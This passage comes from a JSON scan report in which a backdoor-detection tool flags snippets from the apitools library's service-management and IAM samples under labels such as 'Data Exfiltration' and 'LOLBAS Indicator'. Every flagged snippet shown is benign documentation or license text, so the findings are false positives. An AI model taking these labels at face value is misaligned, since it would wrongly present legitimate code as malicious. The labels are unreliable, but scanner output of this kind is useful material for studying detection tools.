                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 6,
                  "endLine": 64,
                  "endColumn": 16,
                  "snippet": {
                    "text": "      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n",
                    "rendered": {
                      "text": "      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n",
                      "markdown": "`      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 1616,
                  "endLine": 1865,
                  "endColumn": 1669,
                  "snippet": {
                    "text": ", it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting",
                    "rendered": {
                      "text": ", it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting",
                      "markdown": "`, it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. A typical workflow has multiple steps. Each step may\\n    have a `Status` message for error reporting`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 1510,
                  "endLine": 1865,
                  "endColumn": 1568,
                  "snippet": {
                    "text": "sed in different client libraries and different wire protocols, it can be\\nmapped differently. For example, it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. ",
                    "rendered": {
                      "text": "sed in different client libraries and different wire protocols, it can be\\nmapped differently. For example, it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. ",
                      "markdown": "`sed in different client libraries and different wire protocols, it can be\\nmapped differently. For example, it will likely be mapped to some exceptions\\nin Java, but more likely mapped to some error codes in C.\\n\\n# Other uses\\n\\nThe error model and the `Status` message can be used in a variety of\\nenvironments, either with or without APIs, to provide a\\nconsistent developer experience across different environments.\\n\\nExample uses of this error model include:\\n\\n- Partial errors. If a service needs to return partial errors to the client,\\n    it may embed the `Status` in the normal response to indicate the partial\\n    errors.\\n\\n- Workflow errors. `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1865,
                  "startColumn": 114,
                  "endLine": 1865,
                  "endColumn": 131,
                  "snippet": {
                    "text": "     \"type\": \"any\",\n            \"description\": \"Properties of the object. Contains field @type with type URL.\"\n          }\n        }\n      }\n    },\n    \"Status\": {\n      \"id\": \"Status\",\n      \"description\": \"The `Status` type defines a logical error model that is suitable for different\\nprogramming environments, including REST APIs and RPC APIs. It is used by\\n[gRPC](https:\\/\\/github.com\\/grpc). The error model is designed to be:\\n\\n- Simple to use and understand for most users\\n- Flexible enough to meet unexpected needs\\n\\n# Overview\\n\\nThe `Status` message contains three pieces of data: error code, error mes",
                    "rendered": {
                      "text": "     \"type\": \"any\",\n            \"description\": \"Properties of the object. Contains field @type with type URL.\"\n          }\n        }\n      }\n    },\n    \"Status\": {\n      \"id\": \"Status\",\n      \"description\": \"The `Status` type defines a logical error model that is suitable for different\\nprogramming environments, including REST APIs and RPC APIs. It is used by\\n[gRPC](https:\\/\\/github.com\\/grpc). The error model is designed to be:\\n\\n- Simple to use and understand for most users\\n- Flexible enough to meet unexpected needs\\n\\n# Overview\\n\\nThe `Status` message contains three pieces of data: error code, error mes",
                      "markdown": "`     \"type\": \"any\",\n            \"description\": \"Properties of the object. Contains field @type with type URL.\"\n          }\n        }\n      }\n    },\n    \"Status\": {\n      \"id\": \"Status\",\n      \"description\": \"The `Status` type defines a logical error model that is suitable for different\\nprogramming environments, including REST APIs and RPC APIs. It is used by\\n[gRPC](https:\\/\\/github.com\\/grpc). The error model is designed to be:\\n\\n- Simple to use and understand for most users\\n- Flexible enough to meet unexpected needs\\n\\n# Overview\\n\\nThe `Status` message contains three pieces of data: error code, error mes`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 762,
                  "startColumn": 11,
                  "endLine": 762,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n",
                    "rendered": {
                      "text": "  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n",
                      "markdown": "`  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 670,
                  "startColumn": 40,
                  "endLine": 670,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    conditions: Additional restrictions that must be met\n    description: Human-readable description of the rule.\n    in_: If one or more 'in' clauses are specified, the rule matches if the\n      PRINCIPAL/AUTHORITY_SELECTOR is in at least one of these entries.\n    logConfig: The config returned to callers of tech.iam.IAM.CheckPolicy for\n      any entries that match the LOG action.\n    notIn: If one or more 'not_in' clauses are specified, the rule matches if\n",
                    "rendered": {
                      "text": "    conditions: Additional restrictions that must be met\n    description: Human-readable description of the rule.\n    in_: If one or more 'in' clauses are specified, the rule matches if the\n      PRINCIPAL/AUTHORITY_SELECTOR is in at least one of these entries.\n    logConfig: The config returned to callers of tech.iam.IAM.CheckPolicy for\n      any entries that match the LOG action.\n    notIn: If one or more 'not_in' clauses are specified, the rule matches if\n",
                      "markdown": "`    conditions: Additional restrictions that must be met\n    description: Human-readable description of the rule.\n    in_: If one or more 'in' clauses are specified, the rule matches if the\n      PRINCIPAL/AUTHORITY_SELECTOR is in at least one of these entries.\n    logConfig: The config returned to callers of tech.iam.IAM.CheckPolicy for\n      any entries that match the LOG action.\n    notIn: If one or more 'not_in' clauses are specified, the rule matches if\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 576,
                  "startColumn": 51,
                  "endLine": 576,
                  "endColumn": 60,
                  "snippet": {
                    "text": "    bindings: Associates a list of `members` to a `role`. Multiple `bindings`\n      must not be specified for the same `role`. `bindings` with no members\n      will result in an error.\n    etag: `etag` is used for optimistic concurrency control as a way to help\n      prevent simultaneous updates of a policy from overwriting each other. It\n      is strongly suggested that systems make use of the `etag` in the read-\n      modify-write cycle to perform policy updates in order to avoid race\n",
                    "rendered": {
                      "text": "    bindings: Associates a list of `members` to a `role`. Multiple `bindings`\n      must not be specified for the same `role`. `bindings` with no members\n      will result in an error.\n    etag: `etag` is used for optimistic concurrency control as a way to help\n      prevent simultaneous updates of a policy from overwriting each other. It\n      is strongly suggested that systems make use of the `etag` in the read-\n      modify-write cycle to perform policy updates in order to avoid race\n",
                      "markdown": "`    bindings: Associates a list of `members` to a `role`. Multiple `bindings`\n      must not be specified for the same `role`. `bindings` with no members\n      will result in an error.\n    etag: `etag` is used for optimistic concurrency control as a way to help\n      prevent simultaneous updates of a policy from overwriting each other. It\n      is strongly suggested that systems make use of the `etag` in the read-\n      modify-write cycle to perform policy updates in order to avoid race\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 555,
                  "startColumn": 16,
                  "endLine": 555,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\nclass Policy(_messages.Message):\n  r\"\"\"Defines an Identity and Access Management (IAM) policy. It is used to\n  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n",
                    "rendered": {
                      "text": "\nclass Policy(_messages.Message):\n  r\"\"\"Defines an Identity and Access Management (IAM) policy. It is used to\n  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n",
                      "markdown": "`\nclass Policy(_messages.Message):\n  r\"\"\"Defines an Identity and Access Management (IAM) policy. It is used to\n  specify access control policies for Cloud Platform resources.   A `Policy`\n  consists of a list of `bindings`. A `Binding` binds a list of `members` to a\n  `role`, where the members can be user accounts, Google groups, Google\n  domains, and service accounts. A `role` is a named list of permissions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 538,
                  "startColumn": 50,
                  "endLine": 538,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n",
                    "rendered": {
                      "text": "  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n",
                      "markdown": "`  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n  field: \"iam_principal\" }   ==> increment counter\n  /iam/policy/backend_debug_access_count\n  {iam_principal=[value of IAMContext.principal]}  At this time we do not\n  support: * multiple field names (though this may be supported in the future)\n  * decrementing the counter * incrementing it by anything other than 1\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 532,
                  "startColumn": 59,
                  "endLine": 532,
                  "endColumn": 63,
                  "snippet": {
                    "text": "  start with a '/', generally be lowercase-only, and end in \"_count\". Field\n  names should not contain an initial slash. The actual exported metric names\n  will have \"/iam/policy\" prepended.  Field names correspond to IAM request\n  parameters and field values are their respective values.  At present the\n  only supported field names are    - \"iam_principal\", corresponding to\n  IAMContext.principal;    - \"\" (empty string), resulting in one aggretated\n  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n",
                    "rendered": {
                      "text": "  start with a '/', generally be lowercase-only, and end in \"_count\". Field\n  names should not contain an initial slash. The actual exported metric names\n  will have \"/iam/policy\" prepended.  Field names correspond to IAM request\n  parameters and field values are their respective values.  At present the\n  only supported field names are    - \"iam_principal\", corresponding to\n  IAMContext.principal;    - \"\" (empty string), resulting in one aggretated\n  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n",
                      "markdown": "`  start with a '/', generally be lowercase-only, and end in \"_count\". Field\n  names should not contain an initial slash. The actual exported metric names\n  will have \"/iam/policy\" prepended.  Field names correspond to IAM request\n  parameters and field values are their respective values.  At present the\n  only supported field names are    - \"iam_principal\", corresponding to\n  IAMContext.principal;    - \"\" (empty string), resulting in one aggretated\n  counter with no field.  Examples:   counter { metric: \"/debug_access_count\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 27,
                  "endLine": 3,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n",
                    "rendered": {
                      "text": "\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n",
                      "markdown": "`\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 858,
                  "startColumn": 9,
                  "endLine": 858,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass SignJwtResponse(_messages.Message):\n  r\"\"\"The service account sign JWT response.\n\n  Fields:\n    keyId: The id of the key used to sign the JWT.\n",
                    "rendered": {
                      "text": "\n\nclass SignJwtResponse(_messages.Message):\n  r\"\"\"The service account sign JWT response.\n\n  Fields:\n    keyId: The id of the key used to sign the JWT.\n",
                      "markdown": "`\n\nclass SignJwtResponse(_messages.Message):\n  r\"\"\"The service account sign JWT response.\n\n  Fields:\n    keyId: The id of the key used to sign the JWT.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 848,
                  "startColumn": 9,
                  "endLine": 848,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass SignJwtRequest(_messages.Message):\n  r\"\"\"The service account sign JWT request.\n\n  Fields:\n    payload: The JWT payload to sign, a JSON JWT Claim set.\n",
                    "rendered": {
                      "text": "\n\nclass SignJwtRequest(_messages.Message):\n  r\"\"\"The service account sign JWT request.\n\n  Fields:\n    payload: The JWT payload to sign, a JSON JWT Claim set.\n",
                      "markdown": "`\n\nclass SignJwtRequest(_messages.Message):\n  r\"\"\"The service account sign JWT request.\n\n  Fields:\n    payload: The JWT payload to sign, a JSON JWT Claim set.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 836,
                  "startColumn": 9,
                  "endLine": 836,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass SignBlobResponse(_messages.Message):\n  r\"\"\"The service account sign blob response.\n\n  Fields:\n    keyId: The id of the key used to sign the blob.\n",
                    "rendered": {
                      "text": "\n\nclass SignBlobResponse(_messages.Message):\n  r\"\"\"The service account sign blob response.\n\n  Fields:\n    keyId: The id of the key used to sign the blob.\n",
                      "markdown": "`\n\nclass SignBlobResponse(_messages.Message):\n  r\"\"\"The service account sign blob response.\n\n  Fields:\n    keyId: The id of the key used to sign the blob.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 826,
                  "startColumn": 9,
                  "endLine": 826,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass SignBlobRequest(_messages.Message):\n  r\"\"\"The service account sign blob request.\n\n  Fields:\n    bytesToSign: The bytes to sign.\n",
                    "rendered": {
                      "text": "\n\nclass SignBlobRequest(_messages.Message):\n  r\"\"\"The service account sign blob request.\n\n  Fields:\n    bytesToSign: The bytes to sign.\n",
                      "markdown": "`\n\nclass SignBlobRequest(_messages.Message):\n  r\"\"\"The service account sign blob request.\n\n  Fields:\n    bytesToSign: The bytes to sign.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 34,
                  "endLine": 772,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      managed private keys.\n\n  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n",
                    "rendered": {
                      "text": "      managed private keys.\n\n  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n",
                      "markdown": "`      managed private keys.\n\n  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 762,
                  "startColumn": 25,
                  "endLine": 762,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n",
                    "rendered": {
                      "text": "  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n",
                      "markdown": "`  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 761,
                  "startColumn": 52,
                  "endLine": 761,
                  "endColumn": 61,
                  "snippet": {
                    "text": "  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n",
                    "rendered": {
                      "text": "  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n",
                      "markdown": "`  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n  servers to maximize security.  Public keys for all service accounts are also\n  published at the OAuth2 Service Account API.\n\n  Enums:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 757,
                  "startColumn": 42,
                  "endLine": 757,
                  "endColumn": 51,
                  "snippet": {
                    "text": "  r\"\"\"Represents a service account key.  A service account has two sets of\n  key-pairs: user-managed, and system-managed.  User-managed key-pairs can be\n  created and deleted by users.  Users are responsible for rotating these keys\n  periodically to ensure security of their service accounts.  Users retain the\n  private key of these key-pairs, and Google retains ONLY the public key.\n  System-managed key-pairs are managed automatically by Google, and rotated\n  daily without user intervention.  The private key never leaves Google's\n",
                    "rendered": {
